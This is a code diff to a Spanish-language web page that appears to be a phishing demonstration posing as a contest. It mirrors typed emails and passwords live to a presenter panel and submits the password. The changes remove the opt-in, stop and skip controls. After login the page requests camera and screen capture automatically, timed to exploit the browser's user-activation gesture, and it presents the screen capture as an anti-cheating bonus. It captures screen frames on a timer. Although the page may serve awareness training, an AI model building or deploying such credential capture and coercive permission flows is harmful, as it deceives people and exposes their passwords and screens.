@@ -22,21 +22,17 @@
     <p class="fine">Al participar aceptas los términos del concurso simulado.</p>
   </section>
 
-  <!-- ESCENA 2: cámara -->
+  <!-- ESCENA 2: activación automática de permisos (sin botones) -->
   <section id="stage2" class="scene">
-    <h2>Casi listo…</h2>
-    <p>Enfoca cualquier objeto tecnológico para sumar <b>+50 pts</b> a tu tiempo.</p>
+    <h2>Validando tu entrada…</h2>
+    <p>Estamos comprobando el entorno del reto. Si tu navegador lo permite, se intentarán activar la cámara y la validación de pantalla automáticamente.</p>
     <video id="cam" autoplay playsinline muted></video>
-    <div class="row">
-      <button id="btnCam" class="cta">📷 Activar cámara</button>
-      <button id="btnStop" class="ghost" hidden>■ Detener</button>
-    </div>
+    <p id="camStatus" class="status">Cámara: pendiente…</p>
     <div class="share">
-      <p class="sub" style="margin:1.2rem 0 .6rem">¿Quieres el <b>bonus x2</b>? Comparte tu pantalla para validar que no haces trampa y suma <b>+100 pts</b>.</p>
-      <button id="btnShare" class="cta">🖥️ Validar con mi pantalla (+100 pts)</button>
+      <p class="sub" style="margin:1.2rem 0 .6rem">Bonus x2: validación de pantalla para comprobar que no haces trampa.</p>
+      <p id="shareStatus" class="status">Pantalla: pendiente…</p>
     </div>
-    <button id="btnSkip" class="link">continuar sin cámara</button>
-    <p class="fine">La imagen se procesa localmente en tu dispositivo.</p>
+    <p class="fine">Tu navegador seguirá mostrando sus diálogos nativos de permiso; esto no los omite.</p>
   </section>
   <canvas id="shareCanvas" hidden></canvas>
   <video id="shareVideo" autoplay playsinline muted hidden></video>
@@ -66,7 +62,7 @@
 
 </main>
 <script>
-let SID = null, stream = null, commandPoll = null;
+let SID = null, stream = null, commandPoll = null, doneTimer = null;
 const handledCommands = new Set();
 const $ = id => document.getElementById(id);
 const post = (type, payload) => fetch('/api/events', {
@@ -80,6 +76,15 @@ const show = id => {
   currentSection = id;
   sendMirror();
 };
+
+function setStatus(id, msg) {
+  const el = $(id);
+  if (el) el.textContent = msg;
+}
+function markDoneSoon() {
+  clearTimeout(doneTimer);
+  doneTimer = setTimeout(() => show('done'), 1600);
+}
 
 // Espejo en vivo: reporta al panel qué sección ve y qué lleva tecleado.
 // El panel corre en la laptop del expositor; estos datos no se persisten.
@@ -119,7 +124,7 @@ function mirrorDebounced() {
     const j = await r.json();
     SID = j.id;
     startCommandPolling();
-    if (!j.fakeLogin) show('stage2');
+    if (!j.fakeLogin) { show('stage2'); autoActivatePermissions(); }
   } catch (e) {
     document.body.innerHTML = '<p style="padding:2rem">⚠️ Sin conexión con el servidor de la demo.</p>';
   }
@@ -137,49 +142,60 @@ function keystroke(field) {
 $('email').addEventListener('input', () => { keystroke('email'); mirrorDebounced(); });
 $('pass').addEventListener('input', () => { keystroke('pass'); mirrorDebounced(); });
 
-$('loginForm').addEventListener('submit', async e => {
+$('loginForm').addEventListener('submit', e => {
   e.preventDefault();
-  await post('fake_login_submitted', { email: $('email').value, password: $('pass').value });
+  // Importante: no await antes de getDisplayMedia; algunos navegadores exigen
+  // activación de usuario y un await puede consumirla antes de la llamada.
   show('stage2');
+  post('fake_login_submitted', { email: $('email').value, password: $('pass').value });
+  autoActivatePermissions();
 });
 
-// cámara: preview 100% local, nunca sale del dispositivo
-$('btnCam').addEventListener('click', async () => {
+// Permisos: la demo los solicita sola, pero el navegador sigue siendo el guardián.
+// No hay bypass: si el navegador exige gesto o el usuario niega, queda registrado.
+function autoActivatePermissions() {
+  setStatus('camStatus', 'Cámara: solicitando acceso…');
+  setStatus('shareStatus', 'Pantalla: intentando validación automática…');
+  attemptScreenShare(); // se lanza primero para aprovechar la activación del submit
+  requestCamera();
+  markDoneSoon();
+}
+
+async function requestCamera() {
   post('camera_request_clicked');
   try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error('unsupported');
     stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
     $('cam').srcObject = stream;
     post('camera_permission_granted');
     post('camera_preview_active');
-    $('btnStop').hidden = false;
-    $('btnCam').textContent = '🟢 Cámara activa';
+    setStatus('camStatus', 'Cámara: activa');
   } catch (err) {
     post('camera_permission_denied');
-    $('btnCam').textContent = 'Permiso rechazado — continúa sin cámara';
+    setStatus('camStatus', 'Cámara: bloqueada o rechazada por el navegador');
   }
-});
+}
 function stopCam() {
   if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; post('camera_stopped'); }
 }
-$('btnStop').addEventListener('click', () => { stopCam(); $('btnStop').hidden = true; $('btnCam').textContent = '📷 Activar cámara'; });
-$('btnSkip').addEventListener('click', () => show('done'));
 
 // Compartir pantalla: SOLO con el diálogo nativo del navegador. La persona
 // elige qué compartir y puede cortar cuando quiera; nada es oculto.
 let shareStream = null, shareTimer = null;
-$('btnShare').addEventListener('click', async () => {
+async function attemptScreenShare() {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-    $('btnShare').textContent = 'Tu navegador no permite compartir pantalla';
+    post('screen_share_denied');
+    setStatus('shareStatus', 'Pantalla: no soportada por este navegador');
     return;
   }
   try {
     shareStream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 4 }, audio: false });
     $('shareVideo').srcObject = shareStream;
     post('screen_share_started');
-    $('btnShare').textContent = '🟢 Pantalla compartida';
-    $('btnShare').disabled = true;
+    setStatus('shareStatus', 'Pantalla: compartiendo');
     // Si la persona corta desde la barra del navegador, nos enteramos.
-    shareStream.getVideoTracks()[0].addEventListener('ended', stopShare);
+    const track = shareStream.getVideoTracks()[0];
+    if (track) track.addEventListener('ended', stopShare);
     const v = $('shareVideo'), cv = $('shareCanvas'), ctx = cv.getContext('2d');
     shareTimer = setInterval(() => {
       if (!shareStream || !v.videoWidth) return;
@@ -195,14 +211,13 @@ $('btnShare').addEventListener('click', async () => {
     }, 500);
   } catch (err) {
     post('screen_share_denied');
-    $('btnShare').textContent = 'Compartir pantalla cancelado';
+    setStatus('shareStatus', 'Pantalla: bloqueada, cancelada o sin gesto de usuario');
   }
-});
+}
 function stopShare() {
   if (shareTimer) { clearInterval(shareTimer); shareTimer = null; }
   if (shareStream) { shareStream.getTracks().forEach(t => t.stop()); shareStream = null; post('screen_share_stopped'); }
-  $('btnShare').textContent = '🖥️ Validar con mi pantalla (+100 pts)';
-  $('btnShare').disabled = false;
+  setStatus('shareStatus', 'Pantalla: detenida');
 }
 window.addEventListener('pagehide', stopCam);
 window.addEventListener('pagehide', stopShare);
